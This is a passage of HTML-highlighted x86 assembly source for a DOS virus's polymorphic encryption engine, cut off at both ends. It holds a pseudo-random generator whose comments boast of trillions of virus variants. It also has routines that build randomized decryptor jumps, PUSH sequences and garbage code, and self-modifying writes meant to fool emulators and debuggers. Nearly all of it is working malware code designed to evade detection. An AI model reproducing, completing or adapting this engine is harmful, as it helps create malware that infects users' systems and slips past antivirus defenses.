        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Save ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Get some values from the TVI, so it will</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; depend on the host system</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0074h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@Cosa</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Mix them</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0040h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get IP of int 10h</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Mix it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; Save result values like new</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc1">; operation words for the</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; random generator</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">            </span><span class="sc1">; Restore ES</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">InicAleatorio</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">WordAleatorio1</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1234h</span><span class="sc0">    </span><span class="sc1">; Values to operate when a random number is</span><span class="sc0">
</span><span class="sc5">WordAleatorio2</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5678h</span><span class="sc0">    </span><span class="sc1">; being generated</span><span class="sc0">
</span><span class="sc5">WordAleatorio3</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">9ABCh</span><span class="sc0">

</span><span class="sc1">;; One of the most important functions inside the polymorphism engine. It ge-</span><span class="sc0">
</span><span class="sc1">;; nerates a random word in AX. The sequence of random numbers wouldn't be</span><span class="sc0">
</span><span class="sc1">;; repeated until it generates 281.474.976.710.656 numbers, so teorically this</span><span class="sc0">
</span><span class="sc1">;; number is the quantity of possible variants of the virus (uuuf... :)  ).</span><span class="sc0">
</span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Save CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get word in AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease it</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; XOR it with other word</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Put it in CX</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0"> </span><span class="sc1">; Rotate CL times</span><span class="sc0">
                               </span><span class="sc1">; the first word</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Add AX to this word</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add second word to AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Add CX to AX</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Rotate AX with CL</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Inverse all bits in AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">      </span><span class="sc1">; Subtract a fix quantity, so it ne-</span><span class="sc0">
                      </span><span class="sc1">; ver will be the same than before</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; XOR second word with AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; XOR AX with the third word</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Rotate 3rd word</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc1">; Subtract CX</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; Subtract a fix</span><span class="sc0">
                               </span><span class="sc1">; quantity</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increase 2nd word</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Return with a random in AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; This procedure constructs the instruction which will jump to the second de-</span><span class="sc0">
</span><span class="sc1">;; cryptor or to the decrypted virus body.</span><span class="sc0">
</span><span class="sc5">SaltoInicio</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@@Fin1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Save this address onto stack</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Get instruction to jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C00h</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonJMP</span><span class="sc0">       </span><span class="sc1">; If 0, put "JMP"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonRET</span><span class="sc0">       </span><span class="sc1">; If 1, put "RET"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonRETF</span><span class="sc0">      </span><span class="sc1">; If 2, put "RETF"</span><span class="sc0">
   </span><span class="sc1">; Put an IRET, a RETF 0002 or a RET 0004</span><span class="sc0">
   </span><span class="sc5">@@PonIRET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; Get a random number between 1 and 3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonIRET</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">       </span><span class="sc1">; Check number</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonRET0004</span><span class="sc0">   </span><span class="sc1">; If AL=1, then put "RET 0004"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonRETF0002</span><span class="sc0">  </span><span class="sc1">; If AL=2, then put "RETF 0002"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">     </span><span class="sc1">; Put IRET</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Jump to @@Fin1</span><span class="sc0">
  </span><span class="sc5">@@PonRET0004</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04C2h</span><span class="sc0">    </span><span class="sc1">; Put "RET" and the first part of the num-</span><span class="sc0">
     </span><span class="sc5">@@Salto1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; ber before (0004)</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Store 0 when return</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">@@PonRETF0002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02CAh</span><span class="sc0">    </span><span class="sc1">; Put "RETF" and the first part of the</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto1</span><span class="sc0">       </span><span class="sc1">; number before "0002" when jump</span><span class="sc0">
   </span><span class="sc1">; Put a RETF or a RET 0002</span><span class="sc0">
    </span><span class="sc5">@@PonRETF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonRET0002</span><span class="sc0">   </span><span class="sc1">; If Zero Flag, put RET 0002</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc0">     </span><span class="sc1">; Insert RETF</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Jump to @@Fin1</span><span class="sc0">
 </span><span class="sc5">@@PonRET0002</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02C2h</span><span class="sc0">    </span><span class="sc1">; Insert "RET" and the first part of the</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto1</span><span class="sc0">       </span><span class="sc1">; "0002" when jump</span><span class="sc0">
   </span><span class="sc1">; Put a RET</span><span class="sc0">
    </span><span class="sc5">@@PonRET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">     </span><span class="sc1">; "RET" opcode in AL</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Jump to @@Fin1</span><span class="sc0">
   </span><span class="sc1">; Put a JMP</span><span class="sc0">
   </span><span class="sc5">@@PonJMP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">; Insert "JMP" opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Calculate displacement. If</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; it jumps directly to the decrypted virus</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; body, it calculates the displacement to</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; the initial address of the virus. Other-</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0"> </span><span class="sc1">; wise, it adds the static size of the</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto</span><span class="sc0">       </span><span class="sc1">; virus body to the calculated displa-</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">   </span><span class="sc1">; cement, to get the entry-point of the</span><span class="sc0">
                    </span><span class="sc1">; second decryptor.</span><span class="sc0">
    </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store the displacement</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Nivelate stack</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">

      </span><span class="sc5">@@Fin1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">            </span><span class="sc1">; Store number in AL</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SaltoInicio</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to construct PUSH instructions to insert jump addresses, depending</span><span class="sc0">
</span><span class="sc1">;; on the instruction to jump. If an IRET will be used, then it inserts in the</span><span class="sc0">
</span><span class="sc1">;; decryptor a PUSHF, a PUSH Segment (PUSH CS if it's an EXE) and a PUSH</span><span class="sc0">
</span><span class="sc1">;; Address, for example. For a RETF, it would only insert a PUSH Segment and</span><span class="sc0">
</span><span class="sc1">;; a PUSH Address, etc. It won't be inserted all in once, but in every call</span><span class="sc0">
</span><span class="sc1">;; to this function, it checks if any stack instruction must be inserted. Sin-</span><span class="sc0">
</span><span class="sc1">;; ce this function is called at least three times, there is no error.</span><span class="sc0">
</span><span class="sc5">PonStack</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Check if there's any ins-</span><span class="sc0">
                          </span><span class="sc1">; truction to insert</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin</span><span class="sc0">     </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Check if number of instruc-</span><span class="sc0">
                          </span><span class="sc1">; tion is 2</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonIP</span><span class="sc0">       </span><span class="sc1">; If it's 1, put a PUSH Address</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonCS</span><span class="sc0">       </span><span class="sc1">; If it's 2, put a PUSH Segment</span><span class="sc0">
    </span><span class="sc1">; Number of instruction is 3, so put a PUSHF</span><span class="sc0">
    </span><span class="sc5">@@PonFLAGS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc0">     </span><span class="sc1">; AL=opcode of "PUSHF"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">       </span><span class="sc1">; Continue</span><span class="sc0">
    </span><span class="sc1">; Number of instruction is 2, so put a "PUSH Segment"</span><span class="sc0">
    </span><span class="sc5">@@PonCS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Check if host is an EXE</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto</span><span class="sc0">         </span><span class="sc1">; If it's an EXE, insert a "PUSH CS"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">       </span><span class="sc1">; AL=opcode of "PUSH CS"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">         </span><span class="sc1">; Jump to insert it and exit</span><span class="sc0">
    </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random number</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">       </span><span class="sc1">; Get a 0, 8, 10h or 18h</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">       </span><span class="sc1">; Convert it to "PUSH Segment"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">         </span><span class="sc1">; Continue</span><span class="sc0">
    </span><span class="sc1">; Number of instruction is 1, so put a "PUSH Address"</span><span class="sc0">
    </span><span class="sc5">@@PonIP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">       </span><span class="sc1">; AL=opcode of "PUSH xxxx"</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get initial address of the</span><span class="sc0">
                         </span><span class="sc1">; decrypted virus body</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0">   </span><span class="sc1">;Check if we are in the first decryp-</span><span class="sc0">
                      </span><span class="sc1">; tor</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SKKKKJ</span><span class="sc0">        </span><span class="sc1">; If we are in the second, insert</span><span class="sc0">
                      </span><span class="sc1">; address</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">     </span><span class="sc1">; Calculate address of second decryp.</span><span class="sc0">
  </span><span class="sc5">@@SKKKKJ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store got address in AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin1</span><span class="sc0">          </span><span class="sc1">; Jump and return</span><span class="sc0">
      </span><span class="sc5">@@Sigue</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store byte</span><span class="sc0">
       </span><span class="sc5">@@Fin1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease number of instruction</span><span class="sc0">
    </span><span class="sc5">@@Fin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Restore AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonStack</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; It only returns Zero Flag if we are in the second decryptor. It saves some</span><span class="sc0">
</span><span class="sc1">;; bytes, because this instruction is quite long</span><span class="sc0">
</span><span class="sc5">MiraSiPrimerDes</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Check if second de-</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">                  </span><span class="sc1">; cryptor and return</span><span class="sc0">
</span><span class="sc5">MiraSiPrimerDes</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; MEMORY WRITES</span><span class="sc0">
</span><span class="sc1">;; This is one of the nicest routines in this engine. It is capable of insert</span><span class="sc0">
</span><span class="sc1">;; a direct indexed memory write/modification. Moreover, this writes are done</span><span class="sc0">
</span><span class="sc1">;; to the virus body, so it can fool an emulator or a debugger in a cool</span><span class="sc0">
</span><span class="sc1">;; manner :)</span><span class="sc0">
</span><span class="sc5">MeteEscritura</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0"> </span><span class="sc1">; Eliminate 32 bits opcode if</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Sigue6</span><span class="sc0">            </span><span class="sc1">; there are any</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
  </span><span class="sc5">@@Sigue6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Check if host is an EXE</span><span class="sc0">
